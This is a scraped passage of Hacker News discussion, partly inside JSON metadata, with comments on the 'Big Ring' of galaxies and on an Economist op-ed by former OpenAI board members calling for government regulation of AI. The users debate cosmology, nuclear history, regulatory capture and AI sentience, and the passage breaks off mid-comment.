taking it from the article and surrounding works that they're big enough to break cosmological homogeneity as commonly understood, but maybe that's wrong too. reply wizzwizz4 3 hours agorootparentprevIt was predicted, then found accidentally. https://www.ifi.unicamp.br/~assis/Apeiron-V2-p79-84(1995).pd... gives a date of 1948 for the following (Ralph Alpher and Robert Herman): > The temperature of the gas at the time of condensation was 600 K., and the temperature in the Universe at the present time is found to be about 5 K. We hope to pub- lish the details of these calculations in the near future. https://en.wikipedia.org/wiki/Discovery_of_cosmic_microwave_... describes the kinda-accidental confirmation of this theory. reply Brajeshwar 10 hours agoprevPlease be un-natural and custom-made. reply Aardwolf 10 hours agoparentToo bad a ring is still too easy to get created naturally. If it would have had the shape of a square, or a dogecoin, that'd get really interesting reply Galatians4_16 5 hours agoparentprevnext [–]reply Brajeshwar 3 hours agorootparentFifth Element! reply Galatians4_16 2 hours agorootparentAnd Halo… reply barbequeer 4 hours agoparentprevcustom made arrangement of galaxies?? reply Brajeshwar 3 hours agorootparentAliens - custom-made. I didn't want to say man-made! reply breck 10 hours agoprevhttps://arxiv.org/abs/2402.07591 reply layer8 4 hours agoprevThat’s clearly a Cyclops smiley face. Or a weak wifi signal. reply moralestapia 6 hours agoprevWithin 2 trillion galaxies and 10^24 stars, it would be statistically rare not to find any arrangement following a shape that's familiar to us. reply boxed 11 hours agoprevI mean.. you would expect to see rings sometimes if this is a random noise kind of distribution no? reply pwatsonwailes 10 hours agoparentStructures yes, but not at this sort of scale. For reasons*, there's a soft limit on the scale that you'd expect structures** to scale to. There's no technical reason why they can't get bigger, it just becomes spectacularly unlikely that you'd ever get one. The fact that we've found two so far means 1. There's probably more we haven't found yet, and thus they're probably*** more common than we'd expect, and 2. There may be some mechanism we don't yet understand which leads to the emergence of astronomical structures at this sort of scale. * Actually quite interesting reasons, but which take a lot of maths to explain that I'm not going in to here. ** In this case, defined as a thing or set of things in a mathematically simple shape - spheres, rings etc. *** Assuming any bit of the universe is roughly like any other bits, and we didn't just happen to fluke on literally the only place where these exist, and there's two. reply fsloth 9 hours agorootparentCan you give references on the *reasons? Would love to try to do some maths reading in a long while. reply pwatsonwailes 5 hours agorootparentIf you want to do some research on the subject, you're looking for violations of homogeneity, as implied by the Lambda-CDM model of the universe. The lambda in this case is the cosmological constant. You'll need to read up on that too. The shortest, simplest way I can think to explain it is that we expect the universe to look alike, anywhere we look. Think of it like a biopsy - we assume that anywhere we look should be much like anywhere else, because there's no reason to think any area of the universe has special conditions where physics plays by different rules. That sets up some implications around what we think the universe should look like, at different scales. However, we recently have been running into structures which are bigger than we'd expect. Where we get into the maths is to do with the value of the cosmological constant. We currently think it's positive, because the universe is expanding, and its rate of expansion is accelerating. To look into the maths for this, have a Google around the maths behind the accelerating expansion of the universe. reply moralestapia 6 hours agorootparentprev>but which take a lot of maths to explain that I'm not going in to here Yeah, bs. Provide sources to support you argument, that's entry level discourse. reply ziddoap 2 hours agorootparentIf you follow the link from this article to the preprint, you'll find some explanations, references to other papers, as well as enough terminology to do some Googling. Have fun! It's quite interesting. reply moralestapia 46 minutes agorootparentYeah, read the site guidelines, yo. I actually read the article, as you can see by the other comments I've made, and found none of that, but please feel free to correct me and cite here the portions of the paper where that is mentioned. And sure, I could specialize in cosmology and find out the reasons on my own, but also, the burden of proof on that argument is not on me. reply ziddoap 25 minutes agorootparentIntroduction, paragraph 2: >The multiple discoveries of LSSs made throughout the past few decades are well known to challenge our understanding of the Standard Cosmological Model (ΛCDM) [2, 8–12], in particular due to a possible violation of a fundamental assumption, the Cosmological Principle (CP), which states that our Universe is both homogeneous and isotropic on large scales That gives you a couple papers and a few terms that you can get started with. Unless your goal is to argue, instead of learn, which it seems like it might be. reply moralestapia 18 minutes agorootparentContext, as it seems to have been missed: >For reasons*, there's a soft limit on the scale that you'd expect structures** to scale to. The content you cited acknowledges the premise of the Cosmological Principle, but it does not say anything about what these \"reasons\" could be. So, nope, that's not an adequate argument. Again, I could waste my time on a PhD in Cosmology to come back and actually make a good argument for why homogeneity in structure is favored at large cosmological scales ... but why should I? I didn't bring that particular argument into the conversation [1]. 1: https://en.wikipedia.org/wiki/Burden_of_proof_(philosophy) reply ziddoap 15 minutes agorootparent>So, nope, that's not an adequate argument. I'm not trying to argue, lol. You're asking for more information but in such a weirdly aggressive way. The reason there is a soft limit (in our current theories) is because of the cosmological principle Big lol at the wiki linking of burden of proof. Not every conversation is an argument, holy. As much as I love HN, this type of aggressiveness and desire to converse as if defending a dissertation can get bloody exhausting. reply mr_mitm 10 hours agoparentprevYes, that is why the scientists did a statistical analysis, otherwise it wouldn't be worthy of publication. From the arXiv paper: > Using the Convex Hull of Member Spheres (CHMS) algorithm, we estimate that the annulus and inner absorbers of the BR have departures from random expectations, at the density of the control field, of up to 5.2σ. 5 sigma is the gold standard at which we can safely exclude the noise explanation. reply Lammy1 8 hours agorootparentThe artist impression in the article is heavily misleading IMHO. The actual \"ring\" is much more jagged and looks very similar to all the nearby so called \"filaments\" they labeled. I'm not sure if it's crossing the threshold from constellation-ism to real astronomy. Download the arXiv paper and see for yourself. reply sapling-ginger 11 hours agoparentprevSupposedly if you scan the sky long enough, you'd find a copy of Shakespeare's play written in the stars. reply The_Colonel 10 hours agorootparentThe upper estimate of the number of galaxies in the observable universe is 2 trillion, which is far too few to find Shakespeare written with \"galaxy dots\". reply 0xedd 10 hours agorootparentprevWhy? It's not random. reply roenxi 11 hours agoparentprevYeah, maybe. Certainly a theory. But that artist impression has 24 dots, so the odds of getting a circle might be the same as getting a well drawn rabbit, or a \"lol :)\" (pencilling it out 24 dots seems reasonable for a \"lol :)\"). But the fact we got a circle rather than something funny suggests it is probably a phenomenon that causes circles responsible. Circles are far more common in nature than statistics might suggest. Nature well knows circles. reply boxed 1 hour agorootparentI mean.. this could be a circle just from our point of view if the distance measurements are off for a bunch of them... reply p0w3n3d 9 hours agoprevRing of galaxies? That's puppeteers traversing the space... reply kevindamm 7 hours agoparentA Klemperer rosette of galaxies instead of planets? That would be more impressive than a ringworld. reply incognito124 10 hours agoprevStrong Expanse vibes reply ungamedplayer 10 hours agoprevIts a smiley face being drawn in progress. reply petepete 8 hours agoparentPossibly an owl. reply donbox 1 hour agorootparentOr an eye. Almost. reply igtztorrero 6 hours agoprevPi constant appears again reply ur-whale 10 hours agoprevTime to revisit Larry Niven's work I think. reply valval 11 hours agoprevWait till they find a grouping of galaxies of a phallic shape. reply Towaway69 10 hours agoparentThe giant red arc in the image has a certain similarity. reply hprotagonist 6 hours agoparentprev“The Long Man describes what is possibly a collection of three burial mounds, the middle one oblong and the ones to the sides round, quite frankly, in a suggestive arrangement that Nanny Ogg approves of. If geography could talk, this bit of it would be boasting: the whole landscape saying \"I've got a great big tonker\"” reply hoseja 9 hours agoprevFairy ring. reply scaglio 6 hours agoprev*The Three-Body Problem intensifies* reply Galatians4_16 5 hours agoparentOh give me a locus, where the gravitons focus, and the three-body problem is solved… [1] 1. https://www.youtube.com/watch?v=dRns6u5bHuw reply codelikeawolf 3 hours agoprevIt's obviously the result of a construction project by a hitherto unknown Type IV civilization on the Kardashev scale. /s reply jen729w 9 hours agoprevMy partner, mocking: “they found heaven!” reply denton-scratch 10 hours agoprev [–] > 9.2 billion light-years from Earth > cosmological neighbours These structures are more than halfway across the observable Universe. It's ludicrous to claim that they are neighbours. reply namenotrequired 10 hours agoparentThey're saying the Big Ring is a neighbor not of earth, but of the \"giant arc of galaxies\" which \"appears in the same region of sky at the same distance from Earth as the Big Ring\". reply kuschku 10 hours agoparentprev [–] The circle and the arc are cosmological neighbours to one another, not to us. They are close enough to each other. reply denton-scratch 10 hours agorootparent [–] Fair enough; but the article doesn't mention how close together they are. Judging from the diagram, they're separated by an angular distance roughly the same size as the larger structure; so about 3 billion LY. reply kuschku 10 hours agorootparentIf you've got two structures of size X, with a distance of X between them as well, that's relatively close. That's as if Paris had a second Eiffel tower three blocks away. reply denton-scratch 4 hours agorootparentYeah, that makes sense if Paris is just 15 blocks across, and the Eiffel Tower is a couple of blocks wide, and there's nothing (observable) outside Paris. reply Gooblebrai 7 hours agorootparentprev [–] And that doesn't even mean they are really close between them linearly. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A massive structure called the \"Big Ring\" has been discovered 9.2 billion light-years away, challenging existing cosmological theories.",
      "The \"Big Ring\" spans 1.3 billion light-years and does not align with known formation mechanisms, defying the Cosmological Principle of even matter distribution.",
      "This discovery, presented at the 243rd American Astronomical Society meeting, follows the 2022 discovery of the \"Giant Arc,\" another structure that questions current understanding of the universe."
    ],
    "commentSummary": [
      "Astronomers have discovered a 1.3 billion light-year-wide ring of galaxies, leading to debates on whether this alignment is real or an illusion.",
      "The discovery raises questions about early-universe mechanisms, statistical flukes, and the interpretation of large-scale cosmic structures.",
      "The debate includes theoretical implications for the universe's expansion, entropy, energy conservation, and challenges to current cosmological models, emphasizing the need for further research."
    ],
    "points": 191,
    "commentCount": 135,
    "retryCount": 0,
    "time": 1716791572
  },
  {
    "id": 40485318,
    "title": "Ex-OpenAI Board Members Call for Government Regulation of AI Firms",
    "originLink": "https://www.economist.com/by-invitation/2024/05/26/ai-firms-mustnt-govern-themselves-say-ex-members-of-openais-board",
    "originBody": "By InvitationArtificial intelligence AI firms mustn’t govern themselves, say ex-members of OpenAI’s board For humanity’s sake, regulation is needed to tame market forces, argue Helen Toner and Tasha McCauley illustration: dan williams May 26th 2024 Share C an private companies pushing forward the frontier of a revolutionary new technology be expected to operate in the interests of both their shareholders and the wider world? When we were recruited to the board of OpenAI—Tasha in 2018 and Helen in 2021—we were cautiously optimistic that the company’s innovative approach to self-governance could offer a blueprint for responsible ai development. But based on our experience, we believe that self-governance cannot reliably withstand the pressure of profit incentives. With ai’s enormous potential for both positive and negative impact, it’s not sufficient to assume that such incentives will always be aligned with the public good. For the rise of ai to benefit everyone, governments must begin building effective regulatory frameworks now. If any company could have successfully governed itself while safely and ethically developing advanced ai systems, it would have been OpenAI. The organisation was originally established as a non-profit with a laudable mission: to ensure that agi, or artificial general intelligence—ai systems that are generally smarter than humans—would benefit “all of humanity”. Later, a for-profit subsidiary was created to raise the necessary capital, but the non-profit stayed in charge. The stated purpose of this unusual structure was to protect the company’s ability to stick to its original mission, and the board’s mandate was to uphold that mission. It was unprecedented, but it seemed worth trying. Unfortunately it didn’t work. Already have an account?Log in Unlock your free trial to continue Explore all our independent journalism for free for one month. Cancel at any time Free trial Or continue reading this article Register now Share Reuse this content the economist today Handpicked stories, in your inbox A daily newsletter with the best of our journalism Sign up Yes, I agree to receive exclusive content, offers and updates to products and services from The Economist Group. I can change these preferences at any time. More from By Invitation Emmanuel Macron has done Europe a favour, reckons Germany’s opposition leader But Friedrich Merz insists that the continent has “no time to die” Olaf Scholz on why Vladimir Putin’s brutal imperialism will fail Germany’s chancellor says Europe needs more military muscle Powerful states are finding it harder to dodge legal challenges, says Marc Weller The law professor believes the ICC’s creeping jurisdiction is part of a broader trend",
    "commentLink": "https://news.ycombinator.com/item?id=40485318",
    "commentBody": "AI firms mustn’t govern themselves, say ex-members of OpenAI’s board (economist.com)176 points by sashank_1509 22 hours agohidepastfavorite179 comments motohagiography 20 hours agoeven though I see the existential concerns with AI, I was at the table with a group of ISPs for the same governance conversations about the internet in the mid 90s and probably still have an RSA encryption munitions t-shirt in a box somewhere. what got bypassed was telco and ITU regulation, and the internet demolished the \"converged\" telco oligopoly system on content and publishing pretty naturally and in a fairly controlled way. given the impact of social media, could similar governance as is being advocated here have enabled the growth and whole new economies the way the platforms have? I don't see it. the people who ostensibly require your consent to serve you are the absolute last people you want to give control of powerful economic tools to, as first, what would they need your consent for if they have the tools, and since they don't actually make anything, by definition these people exist to optimize for solving zero-sum, closed loop problems in their own decision power and for redistribution to their coalitions. they do not -and will not- use AI to create the things that grow. charitably, governors and managers can be the shit from which things grow, but we are not in a shit shortage. imo, governance is the antithesis of desire. open source everything, build everything, release everything as fast as you can because these are the same old people who wanted cryptography backdoored, the internet content policed, speech punished, and now AI controlled. every generation must find a way to thrive in spite of them. reply raxxorraxor 9 hours agoparent> every generation must find a way to thrive in spite of them. Let's hope so. There is a value of having a critical perspective on developments, especially in tech if potential gets mixed up with blind advertising. But there has not been any constructive developments regarding internet technology in the last two decades on a policy level. We got security theatre and surveillance demanded by an old and scared population and you have to always be as vigilant against misdirected politics as you are on any attacks. reply m463 19 hours agoparentprevthere must be a happy medium between daily tps reports and and a no-privacy gig economy. I think the answer is always checks and balances. And some things should be purposefully ambiguous, like \"high crimes and misdemeanors\". reply motohagiography 30 minutes agorootparentsort of interesting on the always part, as I don't think the failure mode of it is acceptable or desirable, where someone whose default is always to have checks/balances is ok with it because presumably they benefit. the alternative to checks and balances is the freedom to defect, exit, repurpose, optimize, compete, reinterpret, etc. we can always invent moderation schemes. even though I think the effect of unregulated social media has been existentially bad for western societies, most of the regulatory state seems pretty happy about the outcome. who could have predicted that all most people really wanted was to deliver food and do soft peepshow sex work while they raged about their outgroups and waited for their 15mins of fame? ugly and messy, but it's what we wanted. The one group you don't want to help are the ones who are actuated by having power over others. It's a sick kink, and the only thing that has kept them at bay so far has been the high bar of competence for math and code. AI changes that, and depriving good people of powerful tools by restricting them to the hands of regulators means only the worst people will have them. Open sourcing everything to take away any moats they may have seems more urgent than ever. reply ein0p 18 hours agoprevNation state governments are responsible for the vast majority of deaths attributable to violence historically. Willingly entrusting them with a potentially world ending technology that they’re 100% certain to abuse is a moronic idea. reply thrance 18 hours agoparentWould it have been better if nuclear weapons had been developed by a private company whose board consisted entirely of lunatics? reply ein0p 17 hours agorootparentThe “responsible” US government proceeded immediately to nuking a bunch of civilians in two cities, narrowly sparing Kyoto. So the answer to that question doesn’t seem clear cut to me. Do realize that you’re putting lunatics in charge in either case, but governments have unlimited budgets and monopoly on violence. reply smegger001 16 hours agorootparentYes the US bombed two cities with civilians, however remember that we were in a state of total war with them, and the contemporary analysis predicted far far higher death toll into the millions using traditional methods. Most Japanese soldiers fought to the death rather than surrender, and those unable to fight were to commit suicide. Civilian populations were being prepared for civilian resistance in force, as in attacking with bamboo spears. It would have been a door to door fight with death tolls in the millions on both sides. Death tolls predicted by both side were unimaginable. (https://en.wikipedia.org/wiki/Operation_Downfall#Operation_K...) It is easy to judge the actions of our grandparents and great grandparents with the information and technology we have now and 80 years distance. Were we in their place I am not sure we would have made a different decision given the information and technology of the time. Further given the difference in death toll predicted with the alternative and the death toll attributed to the bombing, while the results are heart rending and horrifying I am not convinced it was ultimately the wrong decision. reply sashank_1509 13 hours agorootparentPerhaps you should ask what was the motivation of the United States in being in a total war with Japan? Why couldn’t the US accept peace terms, (something the Japanese repeatedly requested), why did the US need Japan to unconditionally surrender, to the point that the US got to rewrote their constitution? (And entertain the thought of hanging their king) I’m not asking if you think this outcome is right, or if you have some post-hoc justification now, I’m asking if you know what justification the US made to themselves in 1940’s to enter total war with Japan, that led them to kill 200,000+ civilians with 2 Nuclear Bombs, and a Tokyo Fire Raid to force Japan to surrender. The past if you really try to understand it was a different country, in our past the Life Magazine of 1944 wrote a story of a soldiers girlfriend receiving a Japanese Skull as a gift with incredible quotes like : “This is a good Jap—a dead one picked up on the New Guinea beach.” Natalie, surprised at the gift, named it Tojo.” (Link: https://time.com/3880997/young-woman-with-jap-skull-portrait...) The typical response to this from present folk is that “But the Japanese did the Rape of Nanking, and other atrocities”, which almost implies (though the astute never explicitly make this implication), that the US fought the Japanese to right all the atrocities that the Japanese were doing in Pacific region. No one who studies history will ever claim this, if you do study history, it’s hard to not see US as a deceitful bully with lunatic tendencies. One reading of our history that I find may not be the whole truth but certainly has a lot of truth to it, is that Japan was a pawn used by the US Government to drum up support for US to enter WW2, something most of the intelligentsia in US desperately wanted to do, but were always hampered by lack of public appetite to involve itself in this bloody conflict on the other side of the world. Unfortunately a side effect of playing this role for Japan was getting bombed into oblivion when you refused to surrender your sovereignty to the allied powers. reply thrance 7 hours agorootparentprevI am not excusing any use of nuclear weapons, simply asking wether it would have been better if it was a private company instead of the US government. Also note that I didn't use the word \"responsible\". At least, the lunatics in the government are supposed to be elected lunatics. reply __loam 16 hours agorootparentprevThe Soviets (now Russia) and the United States have had the power to unleash nuclear devastation many orders of magnitude worse than what we did to Japan for decades yet we've managed not to do it, despite many, many bad faith acts on both sides. The idea that a group of greedy nerds accountable to nobody but their rich investors is more responsible than that is ludicrous. reply ein0p 15 hours agorootparentTo the best of my knowledge the more hinged government of the USSR never actually contemplated nuking anyone. The whole Cuban missile crisis thing was over the unhinged US government placing its nukes in Turkey, right next to USSRs heartland reply 0xfaded 17 hours agoparentprevThat's pretty much the idea, that governments have a monopoly on the use of force. The last 80 years have been unusually peaceful by historical standards. My guess is that the crumbling of governments will lead to more human deaths. reply __loam 16 hours agorootparentPeople who say the UN failed have no idea what they're talking about. reply rightbyte 11 hours agorootparentThey do. They want more of it so they wanna pretend the less of it failed. Swinging the the concept of 'bootlickers' around etc. reply ZhadruOmjar 18 hours agoparentprevThis whole thing seems like a way to build a regulatory framework so only the existing, largest AI players can continue and there is too much regulation for anyone else to enter the industry. reply ein0p 18 hours agorootparentPretty much. I hope we at least get some trillion parameter GPT4 grade FOSS models before they inevitably succeed in regulating linear algebra. reply blackeyeblitzar 15 hours agorootparentThis is the thing that bothers me - we’re just talking about doing math, doing more thinking, doing more speech. That’s what these models are. But everyone who isn’t an independent (non monopolist) technologist is vying for control of something they don’t understand to achieve their political or financial goals. reply edanm 11 hours agoparentprevHumans are responsible for 100% of deaths attributable to violence. So how about we do our best to keep any humans from getting a world-ending technology? reply __loam 16 hours agoparentprevNobody has nuked anyone since Nagasaki so you're not exactly batting a hundred here bud. I'll take flawed democracy over authoritarian corporate self governance any day of the week. Many of the leaders in the valley have repeatedly shown that they are some of the worst people in the country. reply ein0p 14 hours agorootparentThe mere fact that USG nuked Hiroshima and Nagasaki should have put a permanent black mark on its credibility and “hingedness”. Why this is in any way controversial idk. Literally a hundred thousand civilians were killed for no military gain whatsoever. Japan was already done fighting at that point reply __loam 13 hours agorootparentI mean I agree with you (US submarine campaign had already completely cut Japan off), but I think it's pretty obvious that the reason it's \"controversial\" is the fact that Japan was run by a fascist imperial government that was responsible for the deaths of millions of civilians in China and Southeast Asia. I think it's pretty hard to judge the restraint shown when the Axis powers were the ones who started attacks on population centers with events like the Rape of Nanking and the Bombing of London. Most of the the point of the UN was to ensure it never happened again, which it hasn't. reply gmerc 14 hours agoparentprevLet’s give it to Elon instead. /s reply ein0p 13 hours agorootparentUnironically that might be the best available option reply gmerc 8 hours agorootparentUnironically funny answer. reply ein0p 4 hours agorootparentI trust the guy far more than I trust the government at this point. For all his faults at least he’s not genociding children in Gaza and never bombed weddings reply perkolator 7 hours agorootparentprev\"Better yet, we should give it to me and my friends. I promise we are just morally superior and better people in my unbiased opinion.\" reply dhfbshfbu4u3 20 hours agoprevArchived version: https://archive.is/wbwC2 reply z7 20 hours agoprev>Tasha McCauley holds a B.A. from Bard College and a master of Business Administration from the University of South California. >Helen Toner holds an MA in Security Studies from Georgetown, as well as a BSc in Chemical Engineering and a Diploma in Languages from the University of Melbourne. So these are the AI experts...? reply sh1mmer 16 hours agoparentSam Altman holds.. no degree? So presumably using their academic qualifications as a basis for their eligibility for the board of OpenAI is as silly as using Mr Altman’s? Would you give him the benefit of the doubt as an “AI expert” because of his well know work experience at YC? Without discussing their careers at all this comment seems at best unhelpful. reply reducesuffering 11 hours agoparentprevWhy don't you read some of Helen's papers and make a more informed analysis? https://scholar.google.com/citations?user=NNnQg0MAAAAJ&hl=en reply mistrial9 18 hours agoparentprevthere is a tsunami of publicity on this topic, going for months on end.. This short exposition bubbles up to the front page of YNews. Reading it you can see that it quickly moves from \"AI Companies are doing this..\" to direct anecdotes about OpenAI and their infamous origin of being totally helpful and open. Sum the parts with those bios you point out, and you can see that this is intellectually shallow waters with young companies spoken by young voices. Why jump on that harsh interpretation? evidence is in the choice of seatbelts in Dept of Transportation regs to compare to safety. What meatspace regulations are adequate metaphor for what is going on in digital transaction space.? really not showing any effort by the authors, and confirming that this is a made-for-headline news level essay. reply hn_throwaway_99 20 hours agoprevAfter everything I've seen in the time since Altman's ouster then reinstatement at OpenAI, I would definitely admit I was wrong in my original assessment of the board's actions. While I still think how they went about it was both naive and very poorly executed, everything I've read online (both from the board members but, more importantly, from others in-the-know at OpenAI) makes me believe their action was warranted, especially given the stated function of the OpenAI board. I've never met Sam Altman, but the last \"straw\" for me was the recent Scarlett Johansson brouhaha. While I think it's pretty clear they wanted their AI system to evoke Johansson's persona in the movie, OpenAI would have at least had some level of plausible deniability if it weren't for Altman's 3-letter \"her\" tweet. It's like he just couldn't help himself - it seemed the embodiment of these \"tech boy-princes\" who, despite all their often lauded \"genius\", just seem incapable of shutting TFU. I honestly don't mean to solely dump on Altman (see also Musk, Andreessen, etc.), it's just that he's obviously a focus of this article. But everything I've heard about nearly every other tech billionaire makes me think I absolutely do not want them independently in charge of humanity's future with AI. reply prox 20 hours agoparentWhy do these figures all have like this immature thing about them? reply csense 20 hours agorootparentIn order to get to this kind of place, you have to pass three filters: - Your org must be big / famous - You must be the public face of your org - You have an irresistable urge to say edgy things you probably shouldn't People who are comfortable with their place in life are less likely to make it through this filter. reply hn_throwaway_99 20 hours agorootparentprevMy theory is that we're all pretty much that immature, but the rest of us have normal societal guardrails confirming that we're not actually as special and smart as we think we are. But these tech bros and others with that much power have no such societal constraints. And, importantly, they did have huge impacts on society: creating the first popular Internet browser, jumpstarting the EV revolution, exposing the masses to AI - these all really were enormous accomplishments. So it's not that hard to go from there to convincing yourself that your shit don't stink and that you have some unique insight into all areas of human existence. reply throwup238 19 hours agorootparent> My theory is that we're all pretty much that immature, but the rest of us have normal societal guardrails confirming that we're not actually as special and smart as we think we are. I'd offer up the majority of the billionaire class up as a counter example. Most of them aren't household names even though they can easily afford it and their total population is up to over 2,700 people according to Wikipedia. reply astrange 17 hours agorootparentI think most of the millionaire+ class would rather spend money to become /less/ popular rather than more. Consumer facing founder CEOs and musicians are just two subclasses whose job means not doing that. reply felipeerias 18 hours agorootparentprevAltman's \"her\" tweet gathered 21 million impressions and tend of thousands of likes and retweets. It must be hard to remain sane and equanimous when you can command that level of attention with just three letters. reply greenchair 20 hours agorootparentprevjust part of being a sociopath reply jamiek88 20 hours agorootparentI’m starting to believe one cannot be a billionaire without being mentally ill. reply diego_sandoval 20 hours agoparentprevYour whole argument about the Johannson issue depends on the presumption that OpenAI will end up being the loser in the legal battle or in the court of public opinion. I think OpenAI will end up winning the legal battle. The voice is not similar enough to Johannson's for her to win. On the court of public opinion, OpenAI will lose trust from a small portion of the population, but for the rest of the world, it's not gonna matter at all. The positive impact of \"OpenAI just made the movie Her a reality\" is bigger than the negative impact. reply XorNot 18 hours agorootparentAlso that a product seeming \"dangerous\" makes it seem more effective when you're trying to sell it. You see this all the time - it's why \"military-grade\" gets tossed on every random consumer gadget in regards to some specification. It's why if I told you my showerhead's pressure makes it illegal to buy locally, you'd think \"ooh that's probably a really good showerhead\" (yes I made this up, yes I was thinking of Seinfeld when I did). reply whimsicalism 18 hours agoparentprevI have mixed feelings about all the recent controversy and coverage. But frankly if the ScarJo thing was at all significant in how you assess OAI or x-risk, I’m somewhat inclined to discount the opinion. reply dmix 21 hours agoprevAnd let me guess these 2 want to be the ones controlling it (again but with more power) reply toomuchtodo 21 hours agoparentPeople who want to govern shouldn’t be in the role. This selects for service over seeking power. reply whimsicalism 18 hours agorootparentgood luck lol reply williamtrask 21 hours agoparentprevthere's really no evidence of that (in the article or otherwise) reply dmix 19 hours agorootparentYou must not have read much into these people I previously dug into Helen Toner’s history and listened to her talks at conferences on YouTube (including an Effective Altruism one) and read her interviews on other sites where she was strongly against GPT being released to the public. Then we have their behaviour and comments during the coup attempt and her temporary OpenAI CEO, Emmett Shear, she brought in who made a number of radical statements about wanting to cripple AI research before he was put forward as CEO and then he made an awkward, and very evasive, initial statement to employees that scared off many to Sam’s side. He too played coy about his intentions during that timeframe just like Helen avoided publicity despite being the spare, but her past states were revelatory. Not exactly someone’s opinion I trust. This is just being spun as a moderate stance on AI regulation by people who IRL have much more aggressive and non mainstream takes on stopping AI development. Which is why I ask who will be the caretaker in this scenario. reply cpursley 20 hours agoparentprevYou’re getting downvoted but regulatory capture and cronyism (voting in laws that prohibit new entrants; for the greater good, of course) is a trick as old as democratic systems been have established, maybe older and perhaps not exclusive to democracy. reply hn_throwaway_99 19 hours agorootparentHe's getting downvoted because the article specifically calls out the risks of cronyism and regulatory capture. A paywall workaround was posted: https://archive.is/wbwC2. It would benefit a lot of commenters here if they actually read the article first. reply cpursley 5 hours agorootparentThanks. I really wish there was automoderation or even conversion to archive.is of paywalled articles here. reply theropost 21 hours agoparentprevhttps://en.m.wikipedia.org/wiki/The_road_to_hell_is_paved_wi... reply whimsicalism 18 hours agoprevI absolutely agree, but don’t think the solution is self-labeled policy experts from the east coast chattering classes in DC, NYC, and Boston. People involved in the governance need to be conversant in the tech itself. reply rjvs 13 hours agoparentI don’t think that there is anything in the article that disagrees with this. reply stuaxo 6 hours agoprevSam Altman just comes across so sneezy that it's impossible to take anything they say in good faith, so Id assume this comes from a place of suppressing competitors. reply moose44 20 hours agoprevCurious about past examples of industries and companies left to govern themselves? reply maximus-decimus 20 hours agoparentMovie ratings. They censored themselves to avoid the government stepping in. Also professional orders like engineers, accountants and teachers in some places I guess. reply 93po 18 hours agorootparentFilm/TV ratings is a famously terrible, opaque process with no rhyme or reason to it at all, and everyone in hollywood hates it reply maximus-decimus 5 hours agorootparentI mean, they didn't ask for an example where it works well. reply XorNot 18 hours agorootparentprevConversely the Australian experience where the government is involved is just stupid, and gives us random banned games like Bully because it triggers boomer-era moral panic. reply defrost 18 hours agorootparentBully the game rated 'M' in Australia that some parent groups raised a stink about and threatened to ban ? https://www.classification.gov.au/titles/bully-1 Films and computer games classified M (Mature) are not recommended for children under the age of 15. They can have content such as violence and themes that requires a mature outlook. Children under the age of 15 may legally access this content. For an actual example of \"Banned in Australia\" (March 2022) see: The Board considered that the depiction of drug use in the game, Rimworld, did include “illicit or proscribed drug use related to incentives or rewards” and that therefore the Board was required to classify the game, Refused Classification. A game that has received an RC rating cannot be sold, hired, advertised, or legally imported into Australia. Rimworld: https://steamcommunity.com/app/294100 A sci-fi colony sim driven by an intelligent AI storyteller. Generates stories by simulating psychology, ecology, gunplay, melee combat, climate, biomes, diplomacy, interpersonal relationships, art, medicine, trade, and more. https://www.classification.gov.au/about-us/media-and-news/me... reply maximus-decimus 5 hours agorootparentWith the video game South Park, Stick of truth, the Aussie government doesn't approve of things like mini games where underage kids get ass-raped with dildos by aliens so they to replaced the scenes with images of Koalas. reply XorNot 16 hours agorootparentprevKind of the point? The system winds up being stupidly reactionary - at best it's the same outcome as the industry self-regulation. Tossing government enforcement on there though you wind up with the old \"we're just going to ban it\" as an outcome, which you always end up as because people are doing political grandstanding and that requires oneupmanship on their perceived rivals. reply defrost 16 hours agorootparent> Kind of the point? Not that I can see from these examples ... > The system winds up being stupidly reactionary \"The system\" didn't actually react to community outrage and ban Bully though, did it? It appears there are well laid out and publicised ground rules in advance (whether these are fair and reasonable and|or considered as such by how many is another discussion), and that those rules are applied on a case by case basis after review by a largely independant rotating review board who publish their decisions and reasoning. https://www.classification.gov.au/classification-ratings/how... reply andthenzen 20 hours agoparentprevI'd look into industry trade groups and self-regulatory organizations. A few U.S. examples that come to mind are FINRA (broker-dealers), bar associations (lawyers), AMA (doctors), AICPA (accountants), etc. reply hn_throwaway_99 20 hours agorootparentReally glad you brought up FINRA, as I think it's the model that will ultimately work best for AI regulation. Despite their protestations, FINRA is almost a \"quasi-governmental\" organization at this point. I think of it as the SEC being ultimately in charge, but FINRA is responsible for the nitty-gritty, technical details of the regulations. I think with AI, you'll need an industry body because they'll have the needed AI knowledge and expertise about the technology itself, but ultimately a government oversight body carries the legal force of the state. reply __loam 16 hours agorootparentThis is the only good take. Obviously you need the expertise to write effective regulation that limits harm and externalities while still allowing important technical development. But that authority should come from the state, and nothing near anything run by VCs or big tech firms. Otherwise you wind up in regimes like the one we're in now where we still don't have comprehensive privacy policy regulating companies like Google and Meta. reply breakwaterlabs 19 hours agoparentprevLawyers, doctors, engineers, IT practitioners, the film industry,... It's extremely common and has been for literally millenia. reply patrickmay 18 hours agoparentprevUnderwriters Laboratories. reply tbrownaw 20 hours agoparentprevDo things like lawn services and clothing shops count? reply maroonblazer 18 hours agoparentprevVideo games via ESRB, PEGI, et al. reply TulliusCicero 21 hours agoprevIt might be reasonable to have regulations here, but I shudder to think what form they would take, given the typical government level of technological expertise and understanding. reply andy99 21 hours agoparentExisting laws cover almost everything \"bad\" you could do with AI/ML. It's not like there's some \"I used AI\" loophole that exempts one from the law. So most of this is about either regulatory capture, self importance (oh, my linear algebra research is like inventing the atom bomb), ideology, power seeking or a combination. reply janice1999 21 hours agorootparent> Existing laws cover almost everything \"bad\" you could do with AI/ML. If (like many non-EU countries and parts of the US) you don't already have basic digital privacy laws, transparency or consumer protections, that is simply not true. reply riquito 20 hours agorootparentSo in countries were the government doesn't attempt to protect you you'll keep not being protected reply janice1999 20 hours agorootparentAnd AI will make it much worse by lowering the effort required to do harm. reply NegativeLatency 21 hours agorootparentprevI’m not suggesting we’re at this point now, but it would be nice if we create sentient AI if it wasn’t enslaved. I think we would probably need some new laws for the case of non human personhood Not sure what laws would apply or how they’d be enforced based on how we treat people and say chimps, and corporations like people. reply eks391 17 hours agorootparentHow do you determine if an AI is sentient? By it's nature as the execution of code, even if we reach AGI I don't consider it sentient. They wouldn't require rights unless that was required to prevent an apocalyptic scenario. Even then, that would be down to bad code rather than because they were alive. I can see an argument that we are robots because we just execute DNA, protein, and chemical code, but I don't think that really is comparable. We live, grow, and die and 